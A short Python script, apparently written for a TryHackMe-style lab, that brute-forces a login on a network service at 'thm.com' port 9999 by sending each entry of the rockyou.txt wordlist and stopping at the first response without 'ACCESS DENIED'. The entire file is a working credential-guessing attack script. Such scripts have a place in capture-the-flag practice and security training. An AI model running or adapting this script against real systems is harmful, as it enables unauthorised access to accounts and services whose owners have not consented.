import socket
import sys

ip = "thm.com"

port = 9999
timeout = 500

string = "A" * 100

with open('/usr/share/wordlists/rockyou.txt') as pass_file:
    password = pass_file.readline()
    while password:
        try:
            password = password.replace('\n', '')
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print(password)
                s.send(bytes(password, 'latin-1'))
                response = s.recv(1024).replace(b'\x00', b'').decode('utf-8').strip()
                # print(response)
                if "ACCESS DENIED" not in response:
                    print(f'{password} seems to work')
                    sys.exit(0)
                password = pass_file.readline()
        except Exception as ex:
            print(ex)
            sys.exit(0)
